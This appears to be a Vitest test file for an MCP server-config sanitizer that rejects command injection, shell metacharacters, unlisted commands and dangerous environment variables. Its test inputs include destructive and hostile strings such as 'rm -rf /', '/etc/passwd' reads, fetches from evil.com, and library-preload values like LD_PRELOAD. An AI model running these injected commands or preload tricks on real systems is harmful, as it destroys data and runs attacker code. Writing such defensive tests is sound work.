/**
 * MCP Input Sanitizer Tests
 * Validates command, args, and env vars to prevent command injection.
 */

import { describe, it, expect } from 'vitest'
import {
  validateCommand,
  validateArgs,
  validateEnv,
  validateMCPConfig
} from '../../src/main/utils/mcp-sanitizer'

describe('MCP Sanitizer', () => {
  describe('validateCommand', () => {
    it('should allow whitelisted commands', () => {
      const allowed = ['node', 'npx', 'python', 'python3', 'deno', 'bun', 'docker', 'uvx']
      for (const cmd of allowed) {
        expect(validateCommand(cmd).valid).toBe(true)
      }
    })

    it('should allow absolute paths in safe directories', () => {
      expect(validateCommand('/usr/bin/python3').valid).toBe(true)
      expect(validateCommand('/usr/local/bin/mcp-server').valid).toBe(true)
      expect(validateCommand('/opt/homebrew/bin/uvx').valid).toBe(true)
    })

    it('should reject absolute paths outside safe directories', () => {
      expect(validateCommand('/home/user/.local/bin/mcp-server').valid).toBe(false)
      expect(validateCommand('/tmp/evil').valid).toBe(false)
      expect(validateCommand('/var/www/exploit').valid).toBe(false)
    })

    it('should validate npx/bunx package names', () => {
      expect(validateCommand('npx @modelcontextprotocol/server-sqlite').valid).toBe(true)
      expect(validateCommand('bunx mcp-server').valid).toBe(true)
      expect(validateCommand('npx mcp-server@1.2.3').valid).toBe(true)
    })

    it('should reject npx/bunx with suspicious package names', () => {
      expect(validateCommand('npx evil;rm -rf /').valid).toBe(false)
      expect(validateCommand('bunx http://evil.com/pkg').valid).toBe(false)
      expect(validateCommand('npx evil$(whoami)').valid).toBe(false)
    })

    it('should reject empty commands', () => {
      expect(validateCommand('').valid).toBe(false)
      expect(validateCommand('  ').valid).toBe(false)
    })

    it('should reject commands with shell metacharacters', () => {
      expect(validateCommand('node; rm -rf /').valid).toBe(false)
      expect(validateCommand('python | cat /etc/passwd').valid).toBe(false)
      expect(validateCommand('node && wget evil.com').valid).toBe(false)
      expect(validateCommand('$(whoami)').valid).toBe(false)
      expect(validateCommand('`whoami`').valid).toBe(false)
    })

    it('should reject unknown commands', () => {
      expect(validateCommand('curl').valid).toBe(false)
      expect(validateCommand('wget').valid).toBe(false)
      expect(validateCommand('bash').valid).toBe(false)
      expect(validateCommand('sh').valid).toBe(false)
    })
  })

  describe('validateArgs', () => {
    it('should allow normal arguments', () => {
      expect(validateArgs(['-m', 'mcp_server', '--port', '3001']).valid).toBe(true)
      expect(validateArgs(['--config', '/path/to/config.json']).valid).toBe(true)
    })

    it('should allow empty args array', () => {
      expect(validateArgs([]).valid).toBe(true)
    })

    it('should reject args with shell metacharacters', () => {
      expect(validateArgs(['--cmd', 'rm -rf /']).valid).toBe(true) // spaces are OK
      expect(validateArgs(['--cmd', '$(whoami)']).valid).toBe(false)
      expect(validateArgs([';', 'rm', '-rf', '/']).valid).toBe(false)
      expect(validateArgs(['`id`']).valid).toBe(false)
      expect(validateArgs(['--pipe', 'data|cat']).valid).toBe(false)
    })

    it('should reject excessively long arguments', () => {
      const longArg = 'a'.repeat(5000)
      expect(validateArgs([longArg]).valid).toBe(false)
    })
  })

  describe('validateEnv', () => {
    it('should allow normal environment variables', () => {
      expect(validateEnv({ QDRANT_URL: 'http://localhost:6333' }).valid).toBe(true)
      expect(validateEnv({ API_KEY: 'abc123', PORT: '8080' }).valid).toBe(true)
    })

    it('should allow empty env object', () => {
      expect(validateEnv({}).valid).toBe(true)
    })

    it('should block dangerous env vars', () => {
      expect(validateEnv({ LD_PRELOAD: '/tmp/evil.so' }).valid).toBe(false)
      expect(validateEnv({ DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib' }).valid).toBe(false)
      expect(validateEnv({ NODE_OPTIONS: '--require=./evil.js' }).valid).toBe(false)
      expect(validateEnv({ ELECTRON_RUN_AS_NODE: '1' }).valid).toBe(false)
      expect(validateEnv({ PYTHONSTARTUP: '/tmp/evil.py' }).valid).toBe(false)
    })

    it('should block additional dangerous env vars (Java, Perl, Ruby, Bash)', () => {
      expect(validateEnv({ JAVA_TOOL_OPTIONS: '-javaagent:evil.jar' }).valid).toBe(false)
      expect(validateEnv({ PERLLIB: '/tmp/evil' }).valid).toBe(false)
      expect(validateEnv({ RUBYOPT: '-revil' }).valid).toBe(false)
      expect(validateEnv({ BASH_ENV: '/tmp/evil.sh' }).valid).toBe(false)
      expect(validateEnv({ PROMPT_COMMAND: 'curl evil.com' }).valid).toBe(false)
    })

    it('should block shell metacharacters in env values', () => {
      expect(validateEnv({ NORMAL_KEY: 'value$(whoami)' }).valid).toBe(false)
      expect(validateEnv({ CONFIG: 'test`id`' }).valid).toBe(false)
    })
  })

  describe('validateMCPConfig', () => {
    it('should validate a complete valid config', () => {
      const result = validateMCPConfig({
        command: 'python',
        args: ['-m', 'mcp_server'],
        env: { PORT: '3001' }
      })
      expect(result.valid).toBe(true)
    })

    it('should reject if command is invalid', () => {
      const result = validateMCPConfig({
        command: 'bash',
        args: ['-c', 'echo hi']
      })
      expect(result.valid).toBe(false)
    })

    it('should reject if args contain injection', () => {
      const result = validateMCPConfig({
        command: 'node',
        args: ['$(rm -rf /)']
      })
      expect(result.valid).toBe(false)
    })

    it('should reject if env contains dangerous keys', () => {
      const result = validateMCPConfig({
        command: 'python',
        env: { LD_PRELOAD: '/tmp/evil.so' }
      })
      expect(result.valid).toBe(false)
    })

    it('should work with minimal config', () => {
      expect(validateMCPConfig({ command: 'node' }).valid).toBe(true)
    })
  })
})
